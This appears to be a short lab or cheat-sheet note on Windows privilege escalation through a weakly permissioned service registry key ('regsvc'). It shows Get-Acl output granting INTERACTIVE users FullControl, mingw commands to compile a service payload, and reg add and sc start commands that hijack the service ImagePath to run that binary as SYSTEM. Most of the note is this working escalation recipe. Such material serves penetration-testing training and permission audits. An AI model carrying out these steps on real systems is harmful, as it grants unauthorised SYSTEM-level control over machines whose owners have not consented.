Service Template
===============

- ACL
***

        Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
        ...
    
        Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\system\currentc
        ontrolset\services\regsvc
        Owner  : BUILTIN\Administrators
        Group  : NT AUTHORITY\SYSTEM
        Access : Everyone Allow  ReadKey
        NT AUTHORITY\INTERACTIVE Allow  FullControl
        NT AUTHORITY\SYSTEM Allow  FullControl
        BUILTIN\Administrators Allow  FullControl
        Audit  :
        Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)



- Compile
****
        # 64 bits
        x86_64-w64-mingw32-gcc windows_service.c -o service64.exe
        # 32 bits
        i686-w64-mingw32-gcc windows_service.c -o service32.exe


- Execute
*****

1. Place service64.exe in ‘C:\Temp’.
2. Open command prompt at type: 
   

        reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\service64.exe /f


3. In the command prompt type:
   

        sc start regsvc

